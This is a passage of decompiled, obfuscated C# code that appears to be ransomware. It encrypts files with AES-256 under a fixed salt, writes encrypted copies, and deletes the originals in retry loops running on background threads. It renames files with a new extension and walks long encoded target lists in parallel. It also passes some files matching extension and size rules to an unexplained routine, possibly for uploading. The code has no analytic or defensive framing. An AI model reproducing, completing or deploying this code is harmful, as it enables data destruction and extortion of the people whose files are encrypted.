								else if (string_0.ToLower().EndsWith(item3) && YsATJjivDuNMD == xuOTRJXCHgsDSU.getString_0(107396369))
								{
									try
									{
										DqGwyJRAyz.CWnyAidUENok(xuOTRJXCHgsDSU.getString_0(107395595), xuOTRJXCHgsDSU.getString_0(107395590), xuOTRJXCHgsDSU.getString_0(107395545), string_0);
									}
									catch
									{
									}
								}
							}
						}
						string text = lIWyTSJADVGOwjs.iUTbNhATtsHlJ(32);
						string s = wtkmcRpnyDquKa.QNCVDGICcd(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = HAGwxQagSCcKAotj.zQizjsdesaGi(string_0, Convert.ToInt32(zSkjAkSdrNaEQ) * 1024 * 1024);
						array = ((!VOjbVZMNEqmaD) ? (rtwOYUfYif ? HAGwxQagSCcKAotj.pQEqVfqBQsgNPn(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : HAGwxQagSCcKAotj.pQEqVfqBQsgNPn(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.ZqYERyKJrFKUDg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (rtwOYUfYif ? ZSIDzfXTtqFeicqW.ILqMkOByePBB(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ZSIDzfXTtqFeicqW.ILqMkOByePBB(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.ZqYERyKJrFKUDg), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })));
						HAGwxQagSCcKAotj.hoTNCLBmzKEOmkW(string_0, array, bytes);
						if (CS_0024_003C_003E8__locals0.iuKzBvNoRYUqK != xuOTRJXCHgsDSU.getString_0(107393190))
						{
							File.Move(string_0, string_0 + CS_0024_003C_003E8__locals0.iuKzBvNoRYUqK);
						}
					}
					else if (CS_0024_003C_003E8__locals0.iuKzBvNoRYUqK != xuOTRJXCHgsDSU.getString_0(107393190))
					{
						HVPRfDevtwif(string_0, string_0 + CS_0024_003C_003E8__locals0.iuKzBvNoRYUqK, ufZZLSdBndJl);
					}
					else
					{
						HVPRfDevtwif(string_0, string_0 + xuOTRJXCHgsDSU.getString_0(107393185), ufZZLSdBndJl);
					}
					end_IL_00ac_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_03db;
			IL_03db:
			CS_0024_003C_003E8__locals0.KnvlCnzqGAfF.Remove(string_0);
		});
	}

	private static void RgEpeKDaAeQjB(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(string_1, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			FileStream fileStream2 = new FileStream(string_0, FileMode.Open);
			int num;
			while ((num = fileStream2.ReadByte()) != -1)
			{
				cryptoStream.WriteByte((byte)num);
			}
			fileStream2.Dispose();
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (string_1.Length > 0)
				{
					FileStream fileStream3 = new FileStream(string_0, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (eCgqgJacXEtH == getString_0(107396850))
					{
						foreach (string item in hMmNJESmajNLVSI)
						{
							if (string_0.ToLower().EndsWith(item) && YsATJjivDuNMD == getString_0(107396850))
							{
								if (Convert.ToInt32(DLyLpigOjpixLmug) * 1024 * 1024 > fileStream3.Length)
								{
									try
									{
										DqGwyJRAyz.CWnyAidUENok(getString_0(107395578), getString_0(107395573), getString_0(107395528), string_0);
									}
									catch
									{
									}
								}
							}
							else if (string_0.ToLower().EndsWith(item) && YsATJjivDuNMD == getString_0(107396352))
							{
								try
								{
									DqGwyJRAyz.CWnyAidUENok(getString_0(107395578), getString_0(107395573), getString_0(107395528), string_0);
								}
								catch
								{
								}
							}
						}
					}
					fileStream3.Dispose();
					int num2 = 1000000;
					while (true)
					{
						try
						{
							while (File.Exists(string_0) && num2 >= 0)
							{
								File.Delete(string_0);
							}
						}
						catch
						{
							num2--;
							continue;
						}
						break;
					}
					if (string_1.EndsWith(getString_0(107393168)))
					{
						File.Move(string_1, string_1.Replace(getString_0(107393168), getString_0(107394777)));
					}
					return;
				}
				try
				{
					File.Delete(string_1);
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	private static void HVPRfDevtwif(string string_0, string string_1, byte[] byte_0)
	{
		AsKnkpuerjEZaXj CS_0024_003C_003E8__locals0 = new AsKnkpuerjEZaXj();
		CS_0024_003C_003E8__locals0.RtpPzhfHoRLm = string_0;
		CS_0024_003C_003E8__locals0.kcsqfeJjtlRJW = string_1;
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			string kcsqfeJjtlRJW = CS_0024_003C_003E8__locals0.kcsqfeJjtlRJW;
			FileStream fileStream = new FileStream(kcsqfeJjtlRJW, FileMode.Create, FileAccess.ReadWrite, FileShare.ReadWrite);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(byte_0, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
			try
			{
				if (GvhFKpDNFWLzX == getString_0(107396850))
				{
					MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(CS_0024_003C_003E8__locals0.RtpPzhfHoRLm, FileMode.Open);
					MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
					memoryMappedFile.Dispose();
					int num;
					while ((num = memoryMappedViewStream.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num);
					}
					memoryMappedViewStream.Dispose();
				}
				else
				{
					FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals0.RtpPzhfHoRLm, FileMode.Open);
					int num2;
					while ((num2 = fileStream2.ReadByte()) != -1)
					{
						cryptoStream.WriteByte((byte)num2);
					}
					fileStream2.Dispose();
				}
			}
			catch (Exception)
			{
				FileStream fileStream3 = new FileStream(CS_0024_003C_003E8__locals0.RtpPzhfHoRLm, FileMode.Open);
				int num3;
				while ((num3 = fileStream3.ReadByte()) != -1)
				{
					cryptoStream.WriteByte((byte)num3);
				}
				fileStream3.Dispose();
			}
			cryptoStream.Dispose();
			fileStream.Dispose();
			try
			{
				if (CS_0024_003C_003E8__locals0.kcsqfeJjtlRJW.Length > 0)
				{
					if (eCgqgJacXEtH == getString_0(107396850))
					{
						FileStream fileStream4 = new FileStream(CS_0024_003C_003E8__locals0.RtpPzhfHoRLm, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
						foreach (string item in hMmNJESmajNLVSI)
						{
							if (CS_0024_003C_003E8__locals0.RtpPzhfHoRLm.ToLower().EndsWith(item) && YsATJjivDuNMD == getString_0(107396850))
							{
								if (Convert.ToInt32(DLyLpigOjpixLmug) * 1024 * 1024 > fileStream4.Length)
								{
									try
									{
										DqGwyJRAyz.CWnyAidUENok(getString_0(107395578), getString_0(107395573), getString_0(107395528), CS_0024_003C_003E8__locals0.RtpPzhfHoRLm);
									}
									catch
									{
									}
								}
							}
							else if (CS_0024_003C_003E8__locals0.RtpPzhfHoRLm.ToLower().EndsWith(item) && YsATJjivDuNMD == getString_0(107396352))
							{
								try
								{
									DqGwyJRAyz.CWnyAidUENok(getString_0(107395578), getString_0(107395573), getString_0(107395528), CS_0024_003C_003E8__locals0.RtpPzhfHoRLm);
								}
								catch
								{
								}
							}
						}
						fileStream4.Dispose();
					}
					Thread thread = new Thread((ThreadStart)delegate
					{
						while (true)
						{
							try
							{
								File.Delete(CS_0024_003C_003E8__locals0.RtpPzhfHoRLm);
								break;
							}
							catch
							{
								Thread.Sleep(1500);
							}
						}
					});
					thread.Priority = ThreadPriority.Normal;
					thread.IsBackground = true;
					thread.Start();
					if (CS_0024_003C_003E8__locals0.kcsqfeJjtlRJW.EndsWith(getString_0(107393168)))
					{
						File.Move(CS_0024_003C_003E8__locals0.kcsqfeJjtlRJW, CS_0024_003C_003E8__locals0.kcsqfeJjtlRJW.Replace(getString_0(107393168), getString_0(107394777)));
					}
					return;
				}
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					while (true)
					{
						try
						{
							if (File.Exists(CS_0024_003C_003E8__locals0.kcsqfeJjtlRJW))
							{
								File.Delete(CS_0024_003C_003E8__locals0.kcsqfeJjtlRJW);
							}
							break;
						}
						catch
						{
							Thread.Sleep(1500);
						}
					}
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = true;
				thread2.Start();
			}
			catch
			{
			}
		}
		catch (Exception)
		{
		}
	}

	private static void _003CMain_003Eb__6()
	{
		List<string> source = zWDncWjSBzFKqw;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate11 = delegate(string string_0)
			{
				GmDarSxQnFBGZ(getString_0(107393127), string_0);
			};
		}
		Parallel.ForEach(source, CS_0024_003C_003E9__CachedAnonymousMethodDelegate11);
		List<string> source2 = qpFzUvNRAuPZ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate12 = delegate(string string_0)
			{
				GmDarSxQnFBGZ(getString_0(107394020), string_0);
			};
		}
		Parallel.ForEach(source2, CS_0024_003C_003E9__CachedAnonymousMethodDelegate12);
		List<string> pmIelqnjoGmESGJ = PmIelqnjoGmESGJ;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate13 = delegate(string string_0)
			{
				GmDarSxQnFBGZ(XpzNMVUBwHhS(getString_0(107393118)), string_0);
			};
		}
		Parallel.ForEach(pmIelqnjoGmESGJ, CS_0024_003C_003E9__CachedAnonymousMethodDelegate13);
		if (yVgzNpNYZM == getString_0(107396850))
		{
			string[] vIPXLYpgVjF = VIPXLYpgVjF;
			if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 == null)
			{
				CS_0024_003C_003E9__CachedAnonymousMethodDelegate14 = delegate(string string_0)
				{
					GmDarSxQnFBGZ(XpzNMVUBwHhS(getString_0(107393118)), getString_0(107393605) + string_0 + getString_0(107393628));
				};
			}
			Parallel.ForEach(vIPXLYpgVjF, CS_0024_003C_003E9__CachedAnonymousMethodDelegate14);
		}
		rYtrFMMUXXWsWUH(ulUwCBHwSSyi);
		List<string> wTUhRiZneOlt = WTUhRiZneOlt;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate15 = delegate(string string_0)
			{
				GmDarSxQnFBGZ(XpzNMVUBwHhS(getString_0(107393623)), string_0);
			};
		}
		Parallel.ForEach(wTUhRiZneOlt, CS_0024_003C_003E9__CachedAnonymousMethodDelegate15);
		List<string> siUCGwbiYZvKNq = SiUCGwbiYZvKNq;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate16 = delegate(string string_0)
			{
				GmDarSxQnFBGZ(XpzNMVUBwHhS(getString_0(107393566)), string_0);
			};
		}
		Parallel.ForEach(siUCGwbiYZvKNq, CS_0024_003C_003E9__CachedAnonymousMethodDelegate16);
		List<string> kKtWmakpVhdA = KKtWmakpVhdA;
		if (CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 == null)
		{
			CS_0024_003C_003E9__CachedAnonymousMethodDelegate17 = delegate(string string_0)
			{
				GmDarSxQnFBGZ(getString_0(107393549), string_0);
			};
		}
		Parallel.ForEach(kKtWmakpVhdA, CS_0024_003C_003E9__CachedAnonymousMethodDelegate17);
	}

	private static void _003CMain_003Eb__7(string string_0)
	{
		GmDarSxQnFBGZ(getString_0(107393127), string_0);
	}

	private static void _003CMain_003Eb__8(string string_0)
	{
		GmDarSxQnFBGZ(getString_0(107394020), string_0);
	}

	private static void _003CMain_003Eb__9(string string_0)
	{
		GmDarSxQnFBGZ(XpzNMVUBwHhS(getString_0(107393118)), string_0);
	}

	private static void _003CMain_003Eb__a(string string_0)
	{
		GmDarSxQnFBGZ(XpzNMVUBwHhS(getString_0(107393118)), getString_0(107393605) + string_0 + getString_0(107393628));
	}

	private static void _003CMain_003Eb__b(string string_0)
	{
		GmDarSxQnFBGZ(XpzNMVUBwHhS(getString_0(107393623)), string_0);
	}

	private static void _003CMain_003Eb__c(string string_0)
	{
		GmDarSxQnFBGZ(XpzNMVUBwHhS(getString_0(107393566)), string_0);
	}

	private static void _003CMain_003Eb__d(string string_0)
	{
		GmDarSxQnFBGZ(getString_0(107393549), string_0);
	}

	static pMhSnWjBfMXV()
	{
		Strings.CreateGetStringDelegate(typeof(pMhSnWjBfMXV));
		zkqKKKlIPmfFPIZ = getString_0(107394966);
		ufZZLSdBndJl = null;
		IXAXCculmxrX = getString_0(107396352);
		TDenpsblwtjA = getString_0(107393540);
		gnEYEOiddOO = new List<string>();
		ewHbwqsGlfJXFT = new List<string>();
		ePJbKchWtVjQiki = getString_0(107396352);
		ZqYERyKJrFKUDg = getString_0(107394777);
		ylLSIHUuGEVmP = getString_0(107396352);
		FfewSehsvughKG = 0;
		tHjHJyCbAsL = getString_0(107396352);
		EBpgOIGaies = getString_0(107396352);
		lLuRNEZAtcqFnf = getString_0(107396352);
		JagprLLYwUJrTt = getString_0(107393559);
		FsbTAFgxlYvpUL = getString_0(107396850);
		VWoEYWXSVBgvoj = getString_0(107396352);
		LhBCIPCGuuFCA = getString_0(107396352);
		fAqexJEIcKmc = getString_0(107396352);
		aKtQtpADqLTU = new List<string>
		{
			XpzNMVUBwHhS(getString_0(107393554)),
			XpzNMVUBwHhS(getString_0(107393505)),
			XpzNMVUBwHhS(getString_0(107393480)),
			XpzNMVUBwHhS(getString_0(107393495)),
			XpzNMVUBwHhS(getString_0(107393438)),
			XpzNMVUBwHhS(getString_0(107393413)),
			XpzNMVUBwHhS(getString_0(107393428)),
			XpzNMVUBwHhS(getString_0(107393403)),
			XpzNMVUBwHhS(getString_0(107392834)),
			XpzNMVUBwHhS(getString_0(107392809)),
			XpzNMVUBwHhS(getString_0(107392824)),
			XpzNMVUBwHhS(getString_0(107392767)),
			XpzNMVUBwHhS(getString_0(107392742))
		};
		mLpIayRKyplR = new List<string>();
		nEUzFSywfZUr = getString_0(107396850);
		nbrtdkNpmSO = getString_0(107396352);
		otAZsSQeHXan = getString_0(107396352);
		AukkRFRjPWcJymi = new List<string>();
		vfEzOPUSdQRwe = getString_0(107396352);
		WxjJocYdLSiP = getString_0(107392717);
		IXGBrnKSNVJar = getString_0(107396850);
		jESlxKRhnT = getString_0(107396352);
		qpFzUvNRAuPZ = new List<string>
		{
			XpzNMVUBwHhS(getString_0(107392700)),
			XpzNMVUBwHhS(getString_0(107392667)),
			XpzNMVUBwHhS(getString_0(107392634)),
			XpzNMVUBwHhS(getString_0(107393113)),
			XpzNMVUBwHhS(getString_0(107393080)),
			XpzNMVUBwHhS(getString_0(107393051)),
			XpzNMVUBwHhS(getString_0(107392962)),
			XpzNMVUBwHhS(getString_0(107392933)),
			XpzNMVUBwHhS(getString_0(107392920)),
			XpzNMVUBwHhS(getString_0(107392343)),
			XpzNMVUBwHhS(getString_0(107392310)),
			XpzNMVUBwHhS(getString_0(107392277)),
			XpzNMVUBwHhS(getString_0(107392244)),
			XpzNMVUBwHhS(getString_0(107392215)),
			XpzNMVUBwHhS(getString_0(107392186)),
			XpzNMVUBwHhS(getString_0(107392145)),
			XpzNMVUBwHhS(getString_0(107392584)),
			XpzNMVUBwHhS(getString_0(107392559)),
			XpzNMVUBwHhS(getString_0(107392478)),
			XpzNMVUBwHhS(getString_0(107392477)),
			XpzNMVUBwHhS(getString_0(107392416)),
			XpzNMVUBwHhS(getString_0(107392407)),
			XpzNMVUBwHhS(getString_0(107392366)),
			XpzNMVUBwHhS(getString_0(107391789)),
			XpzNMVUBwHhS(getString_0(107391772)),
			XpzNMVUBwHhS(getString_0(107391683)),
			XpzNMVUBwHhS(getString_0(107391674)),
			XpzNMVUBwHhS(getString_0(107391645)),
			XpzNMVUBwHhS(getString_0(107391604)),
			XpzNMVUBwHhS(getString_0(107392059)),
			XpzNMVUBwHhS(getString_0(107391994)),
			XpzNMVUBwHhS(getString_0(107391905)),
			XpzNMVUBwHhS(getString_0(107391840)),
			XpzNMVUBwHhS(getString_0(107391311)),
			XpzNMVUBwHhS(getString_0(107391246)),
			XpzNMVUBwHhS(getString_0(107391189)),
			XpzNMVUBwHhS(getString_0(107391156)),
			XpzNMVUBwHhS(getString_0(107391083)),
			XpzNMVUBwHhS(getString_0(107391554)),
			XpzNMVUBwHhS(getString_0(107391541)),
			XpzNMVUBwHhS(getString_0(107391512)),
			XpzNMVUBwHhS(getString_0(107391447)),
			XpzNMVUBwHhS(getString_0(107391406)),
			XpzNMVUBwHhS(getString_0(107391341)),
			XpzNMVUBwHhS(getString_0(107390788)),
			XpzNMVUBwHhS(getString_0(107390771)),
			XpzNMVUBwHhS(getString_0(107390694)),
			XpzNMVUBwHhS(getString_0(107390653)),
			XpzNMVUBwHhS(getString_0(107390608)),
			XpzNMVUBwHhS(getString_0(107391043)),
			XpzNMVUBwHhS(getString_0(107391030)),
			XpzNMVUBwHhS(getString_0(107390957)),
			XpzNMVUBwHhS(getString_0(107390884)),
			XpzNMVUBwHhS(getString_0(107390855)),
			XpzNMVUBwHhS(getString_0(107390814)),
			XpzNMVUBwHhS(getString_0(107390269)),
			XpzNMVUBwHhS(getString_0(107390224)),
			XpzNMVUBwHhS(getString_0(107390195)),
			XpzNMVUBwHhS(getString_0(107390118)),
			XpzNMVUBwHhS(getString_0(107390053)),
			XpzNMVUBwHhS(getString_0(107390536)),
			XpzNMVUBwHhS(getString_0(107390511)),
			XpzNMVUBwHhS(getString_0(107390446)),
			XpzNMVUBwHhS(getString_0(107390373)),
			XpzNMVUBwHhS(getString_0(107390344)),
			XpzNMVUBwHhS(getString_0(107390303)),
			XpzNMVUBwHhS(getString_0(107389742)),
			XpzNMVUBwHhS(getString_0(107389681)),
			XpzNMVUBwHhS(getString_0(107389576)),
			XpzNMVUBwHhS(getString_0(107389563)),
			XpzNMVUBwHhS(getString_0(107390042)),
			XpzNMVUBwHhS(getString_0(107390001)),
			XpzNMVUBwHhS(getString_0(107389892)),
			XpzNMVUBwHhS(getString_0(107389879)),
			XpzNMVUBwHhS(getString_0(107389246)),
			XpzNMVUBwHhS(getString_0(107389197)),
			XpzNMVUBwHhS(getString_0(107389200)),
			XpzNMVUBwHhS(getString_0(107389127)),
			XpzNMVUBwHhS(getString_0(107389062)),
			XpzNMVUBwHhS(getString_0(107389045)),
			XpzNMVUBwHhS(getString_0(107389500)),
			XpzNMVUBwHhS(getString_0(107389467)),
			XpzNMVUBwHhS(getString_0(107389374)),
			XpzNMVUBwHhS(getString_0(107389317)),
			XpzNMVUBwHhS(getString_0(107391189)),
			XpzNMVUBwHhS(getString_0(107388748)),
			XpzNMVUBwHhS(getString_0(107388707)),
			XpzNMVUBwHhS(getString_0(107388618)),
			XpzNMVUBwHhS(getString_0(107388605)),
			XpzNMVUBwHhS(getString_0(107388512)),
			XpzNMVUBwHhS(getString_0(107388999)),
			XpzNMVUBwHhS(getString_0(107388986)),
			XpzNMVUBwHhS(getString_0(107388905)),
			XpzNMVUBwHhS(getString_0(107392059)),
			XpzNMVUBwHhS(getString_0(107388840)),
			XpzNMVUBwHhS(getString_0(107388799)),
			XpzNMVUBwHhS(getString_0(107388230)),
			XpzNMVUBwHhS(getString_0(107391994)),
			XpzNMVUBwHhS(getString_0(107388189)),
			XpzNMVUBwHhS(getString_0(107388108)),
			XpzNMVUBwHhS(getString_0(107388051)),
			XpzNMVUBwHhS(getString_0(107388498)),
			XpzNMVUBwHhS(getString_0(107388417)),
			XpzNMVUBwHhS(getString_0(107391840)),
			XpzNMVUBwHhS(getString_0(107388372)),
			XpzNMVUBwHhS(getString_0(107391156)),
			XpzNMVUBwHhS(getString_0(107391311)),
			XpzNMVUBwHhS(getString_0(107388339)),
			XpzNMVUBwHhS(getString_0(107388282)),
			XpzNMVUBwHhS(getString_0(107391246)),
			XpzNMVUBwHhS(getString_0(107387737)),
			XpzNMVUBwHhS(getString_0(107387656)),
			XpzNMVUBwHhS(getString_0(107387639)),
			XpzNMVUBwHhS(getString_0(107391604)),
			XpzNMVUBwHhS(getString_0(107387582)),
			XpzNMVUBwHhS(getString_0(107387569)),
			XpzNMVUBwHhS(getString_0(107387540)),
			XpzNMVUBwHhS(getString_0(107387511)),
			XpzNMVUBwHhS(getString_0(107387946)),
			XpzNMVUBwHhS(getString_0(107387913)),
			XpzNMVUBwHhS(getString_0(107387920)),
			XpzNMVUBwHhS(getString_0(107387843)),
			XpzNMVUBwHhS(getString_0(107387818)),
			XpzNMVUBwHhS(getString_0(107387777)),
			XpzNMVUBwHhS(getString_0(107387764)),
			XpzNMVUBwHhS(getString_0(107387171)),
			XpzNMVUBwHhS(getString_0(107387114)),
			XpzNMVUBwHhS(getString_0(107387081)),
			XpzNMVUBwHhS(getString_0(107387068)),
			XpzNMVUBwHhS(getString_0(107387035)),
			XpzNMVUBwHhS(getString_0(107386994)),
			XpzNMVUBwHhS(getString_0(107391645)),
			XpzNMVUBwHhS(getString_0(107387171)),
			XpzNMVUBwHhS(getString_0(107387433)),
			XpzNMVUBwHhS(getString_0(107387404)),
			XpzNMVUBwHhS(getString_0(107387407)),
			XpzNMVUBwHhS(getString_0(107387326)),
			XpzNMVUBwHhS(getString_0(107387317)),
			XpzNMVUBwHhS(getString_0(107387256)),
			XpzNMVUBwHhS(getString_0(107386671)),
			XpzNMVUBwHhS(getString_0(107386642)),
			XpzNMVUBwHhS(getString_0(107386609)),
			XpzNMVUBwHhS(getString_0(107386504)),
			XpzNMVUBwHhS(getString_0(107386475)),
			XpzNMVUBwHhS(getString_0(107386942)),
			XpzNMVUBwHhS(getString_0(107386909)),
			XpzNMVUBwHhS(getString_0(107386876)),
			XpzNMVUBwHhS(getString_0(107386831)),
			XpzNMVUBwHhS(getString_0(107386770)),
			XpzNMVUBwHhS(getString_0(107386737)),
			XpzNMVUBwHhS(getString_0(107386148)),
			XpzNMVUBwHhS(getString_0(107386083)),
			XpzNMVUBwHhS(getString_0(107386050)),
			XpzNMVUBwHhS(getString_0(107386041)),
			XpzNMVUBwHhS(getString_0(107385960)),
			XpzNMVUBwHhS(getString_0(107391772)),
			XpzNMVUBwHhS(getString_0(107386443)),
			XpzNMVUBwHhS(getString_0(107386418)),
			XpzNMVUBwHhS(getString_0(107386345)),
			XpzNMVUBwHhS(getString_0(107386332)),
			XpzNMVUBwHhS(getString_0(107386291)),
			XpzNMVUBwHhS(getString_0(107386214)),
			XpzNMVUBwHhS(getString_0(107385641)),
			XpzNMVUBwHhS(getString_0(107385624)),
			XpzNMVUBwHhS(getString_0(107385543)),
			XpzNMVUBwHhS(getString_0(107385518)),
			XpzNMVUBwHhS(getString_0(107385461)),
			XpzNMVUBwHhS(getString_0(107385896)),
			XpzNMVUBwHhS(getString_0(107385855)),
			XpzNMVUBwHhS(getString_0(107385798)),
			XpzNMVUBwHhS(getString_0(107391683)),
			XpzNMVUBwHhS(getString_0(107385757)),
			XpzNMVUBwHhS(getString_0(107385696)),
			XpzNMVUBwHhS(getString_0(107385151)),
			XpzNMVUBwHhS(getString_0(107385142)),
			XpzNMVUBwHhS(getString_0(107385113)),
			XpzNMVUBwHhS(getString_0(107391789)),
			XpzNMVUBwHhS(getString_0(107385072)),
			XpzNMVUBwHhS(getString_0(107384991)),
			XpzNMVUBwHhS(getString_0(107384962)),
			XpzNMVUBwHhS(getString_0(107390536)),
			XpzNMVUBwHhS(getString_0(107384929)),
			XpzNMVUBwHhS(getString_0(107384962)),
			XpzNMVUBwHhS(getString_0(107385412)),
			XpzNMVUBwHhS(getString_0(107385383)),
			XpzNMVUBwHhS(getString_0(107385354)),
			XpzNMVUBwHhS(getString_0(107385337)),
			XpzNMVUBwHhS(getString_0(107385256)),
			XpzNMVUBwHhS(getString_0(107385215)),
			XpzNMVUBwHhS(getString_0(107384642)),
			XpzNMVUBwHhS(getString_0(107384613)),
			XpzNMVUBwHhS(getString_0(107384604)),
			XpzNMVUBwHhS(getString_0(107384559)),
			XpzNMVUBwHhS(getString_0(107384482)),
			XpzNMVUBwHhS(getString_0(107384449)),
			XpzNMVUBwHhS(getString_0(107384904)),
			XpzNMVUBwHhS(getString_0(107384891)),
			XpzNMVUBwHhS(getString_0(107384802)),
			XpzNMVUBwHhS(getString_0(107384769)),
			XpzNMVUBwHhS(getString_0(107384760)),
			XpzNMVUBwHhS(getString_0(107384731)),
			XpzNMVUBwHhS(getString_0(107384126)),
			XpzNMVUBwHhS(getString_0(107384125)),
			XpzNMVUBwHhS(getString_0(107384036)),
			XpzNMVUBwHhS(getString_0(107384027)),
			XpzNMVUBwHhS(getString_0(107383946)),
			XpzNMVUBwHhS(getString_0(107383913)),
			XpzNMVUBwHhS(getString_0(107384408)),
			XpzNMVUBwHhS(getString_0(107384331)),
			XpzNMVUBwHhS(getString_0(107384314)),
			XpzNMVUBwHhS(getString_0(107384237)),
			XpzNMVUBwHhS(getString_0(107384220)),
			XpzNMVUBwHhS(getString_0(107384187)),
			XpzNMVUBwHhS(getString_0(107383634)),
			XpzNMVUBwHhS(getString_0(107383561)),
			XpzNMVUBwHhS(getString_0(107383548)),
			XpzNMVUBwHhS(getString_0(107387317)),
			XpzNMVUBwHhS(getString_0(107383515)),
			XpzNMVUBwHhS(getString_0(107383474)),
			XpzNMVUBwHhS(getString_0(107383417)),
			XpzNMVUBwHhS(getString_0(107383900)),
			XpzNMVUBwHhS(getString_0(107383867)),
			XpzNMVUBwHhS(getString_0(107383834)),
			XpzNMVUBwHhS(getString_0(107383753)),
			XpzNMVUBwHhS(getString_0(107383724)),
			XpzNMVUBwHhS(getString_0(107383679)),
			XpzNMVUBwHhS(getString_0(107383666)),
			XpzNMVUBwHhS(getString_0(107383081)),
			XpzNMVUBwHhS(getString_0(107383056)),
			XpzNMVUBwHhS(getString_0(107382975)),
			XpzNMVUBwHhS(getString_0(107382946)),
			XpzNMVUBwHhS(getString_0(107382933))
		};
		zWDncWjSBzFKqw = new List<string>
		{
			XpzNMVUBwHhS(getString_0(107383372)),
			XpzNMVUBwHhS(getString_0(107383355)),
			XpzNMVUBwHhS(getString_0(107383274)),
			XpzNMVUBwHhS(getString_0(107383209)),
			XpzNMVUBwHhS(getString_0(107383164)),
			XpzNMVUBwHhS(getString_0(107382559))
		};
		PmIelqnjoGmESGJ = new List<string>
		{
			XpzNMVUBwHhS(getString_0(107382502)),
			XpzNMVUBwHhS(getString_0(107382469)),
			XpzNMVUBwHhS(getString_0(107382456)),
			XpzNMVUBwHhS(getString_0(107382375)),
			XpzNMVUBwHhS(getString_0(107382854)),
			XpzNMVUBwHhS(getString_0(107382837)),
			XpzNMVUBwHhS(getString_0(107382760)),
			XpzNMVUBwHhS(getString_0(107382727)),
			XpzNMVUBwHhS(getString_0(107382694)),
			XpzNMVUBwHhS(getString_0(107382661)),
			XpzNMVUBwHhS(getString_0(107382628)),
			XpzNMVUBwHhS(getString_0(107382083)),
			XpzNMVUBwHhS(getString_0(107382074)),
			XpzNMVUBwHhS(getString_0(107382033)),
			XpzNMVUBwHhS(getString_0(107381956)),
			XpzNMVUBwHhS(getString_0(107381923)),
			XpzNMVUBwHhS(getString_0(107381914)),
			XpzNMVUBwHhS(getString_0(107381881)),
			XpzNMVUBwHhS(getString_0(107382352)),
			XpzNMVUBwHhS(getString_0(107382279)),
			XpzNMVUBwHhS(getString_0(107382246)),
			XpzNMVUBwHhS(getString_0(107382237)),
			XpzNMVUBwHhS(getString_0(107382204)),
			XpzNMVUBwHhS(getString_0(107382502)),
			XpzNMVUBwHhS(getString_0(107382163)),
			XpzNMVUBwHhS(getString_0(107381578)),
			XpzNMVUBwHhS(getString_0(107381565)),
			XpzNMVUBwHhS(getString_0(107381532)),
			XpzNMVUBwHhS(getString_0(107381491)),
			XpzNMVUBwHhS(getString_0(107381418)),
			XpzNMVUBwHhS(getString_0(107381385)),
			XpzNMVUBwHhS(getString_0(107381344)),
			XpzNMVUBwHhS(getString_0(107381847)),
			XpzNMVUBwHhS(getString_0(107382469)),
			XpzNMVUBwHhS(getString_0(107381806)),
			XpzNMVUBwHhS(getString_0(107382456)),
			XpzNMVUBwHhS(getString_0(107381741)),
			XpzNMVUBwHhS(getString_0(107381708)),
